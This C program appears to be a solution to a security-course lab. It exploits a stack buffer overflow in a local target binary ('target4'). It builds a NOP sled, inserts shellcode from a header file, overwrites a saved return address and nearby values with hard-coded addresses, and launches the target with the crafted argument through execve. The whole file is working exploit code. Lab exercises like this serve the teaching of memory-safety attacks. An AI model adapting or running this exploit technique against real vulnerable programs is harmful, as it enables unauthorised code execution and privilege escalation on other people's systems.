#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define NOP 0x90
#define BUFFER_SIZE 256
#define RETURN_ADDRESS 0x40a4fd94

int main(void)
{
        char *args[3];
        char *env[1];

        char attack_buffer[BUFFER_SIZE];

        int i;
        for (i = 0; i < BUFFER_SIZE; i++)
        {
                attack_buffer[i] = NOP;
        }

        char *ptr = attack_buffer + 10;

        for (i = 0; i < strlen(shellcode); i++)
        {
                ptr[i] = shellcode[i];
        }

        *(int *) & attack_buffer[216] = RETURN_ADDRESS;
        *(int *) & attack_buffer[200] = 0x01ffffff;
        *(int *) & attack_buffer[204] = 0x01ffffef;
        attack_buffer[220] = 0x00;

        args[0] = TARGET;
        args[1] = attack_buffer;
        args[2] = NULL;

        env[0] = NULL;

        if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

        return 0;
}
